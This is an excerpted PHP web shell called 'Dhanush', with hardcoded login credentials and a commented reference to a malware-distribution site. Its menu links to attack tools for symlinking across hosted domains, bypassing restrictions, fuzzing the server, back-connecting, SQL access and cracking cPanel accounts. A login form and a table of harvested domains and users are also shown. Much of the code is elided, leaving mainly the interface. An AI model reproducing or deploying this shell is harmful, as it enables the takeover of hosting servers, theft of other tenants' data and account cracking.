...
$user = "Dhanush";
$pass = "Dhanush";
$malsite = "";  // Malware Site = http://fightagent.ru
...
?>
<div align="center">
<a href="<?php $_SERVER['PHP_SELF'];?>"><span class=headtitle><font face="Times New Roman, Times, serif" size="6">Dhanush: By Arjun</font></span></a>
...
<table border="3" style="border-color:#333333;" width="100%;" cellpadding="1" cellspacing="8">
	<tr align="center">
		<td class="myfun"><a href="<?php echo $self.'?symlinkserver'?>"><font class="fun">[Symlink]</font></a></td>
		<td class="myfun"><a href="<?php echo $self.'?forum'?>"><font class="fun">[Forum]</font></a></td>
		...
		<td class="myfun"><a href="<?php echo $self.'?bypass';?>"><font class="fun">[Bypassers]</font></a></td>
		<td class="myfun"><a href="<?php echo $self.'?fuzz'?>"><font class="fun">[Server Fuzzer]</font></a></td>
		...
		<td class="myfun"><a href="<?php echo $self.'?connect'?>"><font class="fun">[Connect]</font></a></td>
	</tr>
</table>
<div style="float:left;">
	...
	<a href=""><font style="font-size:14;"> [Refresh] </font></a>&nbsp;</div>
<table style="margin-left:270px; border-color:#333333;" border="2" width="70%;" cellpadding="1" cellspacing="8">
	<tr align="center">
		<td class="myfun"><a href="<?php echo $self.'?database'?>"><font class="fun">[SQL]</font></a></td>
		...
		<td class="myfun"><a href="<?php echo $self.'?cpanel'?>"><font class="fun">[Cpanel Cracker]</font></a></td>
  ...
  --     --        --
   ---  ---   --  ---
	...
	';
				...
				@fclose($fp3);
						echo "<table align=center border=1 style='width:60%;border-color:#333333;'><tr><td align=center><font size=3>S. No.</font></td><td align=center><font size=3>Domains</font></td><td align=center><font size=3>Users</font></td><td align=center><font size=3>Symlink</font></td><td align=center><font size=3>Information</font></td></tr>";
...
<hr>
<div align="center">
<span class=headtitle><font size="6">&#2343;&#2344;&#2369;&#2359;</font></span><br><span class=headtitle><font size="6">--==Coded By Arjun==--</font></span><br>
<a href="http://www.google.com/search?q=%E0%A4%9C%E0%A4%AF%20%E0%A4%B9%E0%A4%BF%E0%A4%A8%E0%A5%8D%E0%A4%A6" target="_blank"><font  size="6">&#2332;&#2351; &#2361;&#2367;&#2344;&#2381;&#2342;</font></a></div>
<?php 
}	
 ...
 <center>
	...
	<div class="logindiv">
		<table cellpadding="9" cellspacing="4">
			<tr>
				<td align="center" colspan="2"><blink><font class="headtitle" size="7"><b>Dhanush </b></font></blink></td>
			</tr>
			<tr>
				<td align="right"><b>User Name : </b></td>
				<td><input type="text" name="uname" class="sbox"  value="User Name" onFocus="if (this.value == 'User Name'){this.value=''; this.style.color='black';}" onBlur="if (this.value == '') {this.value='User Name'; this.style.color='#828282';}" AUTOCOMPLETE="OFF"></td>
			</tr>
			<tr>
				<td align="right"><b>Password : </b></td>
				<td><input type="password" name="passwd" class="sbox"  value="User Name" onFocus="if (this.value == 'User Name'){this.value=''; this.style.color='black';}" onBlur="if (this.value == '') {this.value='User Name'; this.style.color='#828282';}" AUTOCOMPLETE="OFF"></td>
			</tr>
			<tr>
